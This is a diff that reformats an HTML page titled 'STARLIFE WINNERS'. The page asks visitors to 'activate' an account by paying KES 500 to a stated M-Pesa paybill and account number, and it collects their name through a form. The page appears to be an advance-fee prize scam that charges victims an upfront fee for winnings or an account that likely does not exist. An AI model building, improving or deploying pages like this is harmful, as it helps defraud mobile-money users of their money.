@@ -1,5 +1,8 @@
 <!DOCTYPE html>
-<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>STARLIFE WINNERS</title>
 <style>
 body{background:#0a0a0a;color:white;font-family:Arial;margin:0}
@@ -7,19 +10,24 @@ body{background:#0a0a0a;color:white;font-family:Arial;margin:0}
 .logo{color:#ffcc00;font-weight:bold;font-size:20px}
 .main{padding:16px;max-width:500px;margin:auto}
 .c{background:#151515;border:1px solid #333;border-radius:10px;padding:16px}
-.payBox{background:#1a1a0a;border:1px solid #444;border-radius:8px;padding:12px;text-align:center;margin:10px 0}
+.payBox{background:#1a1a0a;border:1px solid #444;border-radius:8px;padding:12px;text-align:center;margin:10px 0;font-size:15px}
 .mpesaBox{background:#0f1f0f;border-radius:8px;padding:12px;border:1px dashed #00a651}
 input{width:100%;padding:12px;margin:8px 0;border-radius:6px;border:1px solid #333;background:#222;color:white;box-sizing:border-box}
 button{width:100%;padding:14px;border:none;border-radius:6px;font-weight:bold;font-size:16px;cursor:pointer}
 .btn-pay{background:#00a651;color:white}
 #msg{text-align:center;font-weight:bold;margin-top:10px}
-</style></head><body>
+</style>
+</head>
+<body>
 <div class="h"><div class="logo">★ STARLIFE WINNERS</div></div>
 <div class="main">
 <div class="c">
 <h3 style="text-align:center;color:#ffcc00">ACTIVATE ACCOUNT</h3>
 <div class="payBox">
-<b>LIPA NA M-PESA</b><br>Paybill: 714777<br>Account: 440200282954<br>Amount: <b style="color:#00ff88">KES 500</b>
+<b>LIPA NA M-PESA</b><br>
+Paybill: 714777<br>
+Account: 440200282954<br>
+Amount: <b style="color:#00ff88">KES 500</b>
 </div>
 <div class="mpesaBox">
 <input type="text" id="name" placeholder="Your Full Name">
@@ -47,4 +55,5 @@ async function submitCode(){
  }catch(e){msg.style.color='red';msg.innerText='Network error';}
 }
 </script>
-</body></html>
+</body>
+</html>
